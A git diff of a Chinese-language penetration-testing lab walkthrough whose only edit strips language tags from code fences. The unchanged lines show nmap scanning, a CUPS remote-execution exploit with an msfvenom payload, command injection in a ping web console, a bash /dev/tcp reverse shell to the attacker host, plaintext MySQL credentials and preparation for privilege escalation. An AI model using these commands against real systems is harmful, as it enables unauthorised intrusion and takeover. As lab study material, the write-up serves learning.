@@ -16,7 +16,7 @@
 
 `ifconfig` 获取攻击机的 ip 为 `10.0.2.3`，使用 `nmap` 扫描 ip：
 
-```yacas
+```
 > nmap -sn 10.0.2.0/24
 Starting Nmap 7.95 ( nmap.org ) at 2025-10-19 20:47 CST
 Nmap scan report for bogon (10.0.2.1)
@@ -37,7 +37,7 @@ Nmap done: 256 IP addresses (4 hosts up) scanned in 2.12 seconds
 
 以下是关键的节选内容，每个服务都会有相应的注释说明
 
-```yacas
+```
 // SSH 服务，支持 SSHv1
 // OpenSSH 3.9p1 的发布日期为 2004 年 8 月，也非常古老
 // 可能存在漏洞
@@ -115,7 +115,7 @@ MAC Address: 08:00:27:EB:BA:50 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 
 CUPS 1.1 是这个服务的第一个稳定发行版，考虑 `searchsploit` 获取已知 `exploit`
 
-```yacas
+```
 > searchsploit cups 1.1
 ---------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                        |  Path
@@ -134,7 +134,7 @@ Shellcodes: No Results
 
 `CUPS < 2.0.3 - Remote Command Execution` 远程代码执行，考虑使用这个，使用 `searchsploit -m 41233` 取一份到本地运行：
 
-```yacas
+```
 > python 41233.py
   File "/home/kali/Desktop/41233.py", line 16
     print '''
@@ -144,7 +144,7 @@ SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
 
 把 SyntaxError 的内容 SFTW 一下发现是因为使用了 Python 2 语法，继续：
 
-```yacas
+```
 > python2 41233.py
 python script.py <args>
    -h, --help:             Show this message
@@ -162,7 +162,7 @@ python script.py -a 10.10.10.10 -b 631 -c /tmp/x86reverseshell.so
 
 继续 STFW 发现了 `msfvenom`，支持生成各种各样的 payload（预装于 Kali）
 
-```yacas
+```
 // 运行 msfvenom -h
 > msfvenom -h
 MsfVenom - a Metasploit standalone payload generator.
@@ -204,7 +204,7 @@ Saved as: payload.so
 
 然后运行：
 
-```yacas
+```
 > python2 41233.py -a 10.0.2.15 -b 631 -c ./payload.so
 [*]     locate available printer
 [-]     no printers
@@ -224,7 +224,7 @@ Saved as: payload.so
 
 ![image-20251019223000171](images/image-20251019223000171.png)
 
-```yacas
+```
 127.0.0.1
 
 PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
@@ -240,7 +240,7 @@ rtt min/avg/max/mdev = 0.283/0.400/0.508/0.095 ms, pipe 2
 
 发现 Web Console 直接执行了一个 `ping 127.0.0.1` 的操作，尝试一个命令注入
 
-```yacas
+```
 > 127.0.0.1 | whoami
 apache
 ```
@@ -249,7 +249,7 @@ apache
 
 为了方便操作我们先获取一个反向 Shell：
 
-```yacas
+```
 // Web 页面，命令注入
 > 127.0.0.1|bash -i >& /dev/tcp/10.0.2.3/1234 0>&1
 // 攻击机 Shell，nc 连接反向 Shell
@@ -269,7 +269,7 @@ Getshll 操作完成
 
 MySQL 服务通常以高权限运行，可以先获得 MySQL 的管理员账户，再通过 UDP 执行系统指令
 
-```yacas
+```
 /* /var/www/html/index.php 存放 Apache 的文档根目录（默认）*/
 > bash-3.00$ cat /var/www/html/index.php
 <?php
@@ -309,7 +309,7 @@ if (isset($_POST['submit'])){
 
 尝试修改 `pingit.php` 提权发现没有权限，根据 `index.php` 的明文账号密码登录 MySQL
 
-```yacas
+```
 bash-3.00$ mysql -u john -p
 Enter password: hiroshima
 // 进入 MySQL
@@ -365,7 +365,7 @@ Create_tmp_table_priv: N
 
 之前有确定操作系统为 CentOS，先进一步获取系统版本，然后上传一份对应版本的漏洞脚本
 
-```yacas
+```
 /* 靶机反向 Shell */
 bash-3.00$ cat /etc/lsb-release.d
 CentOS release 4.5 (Final)
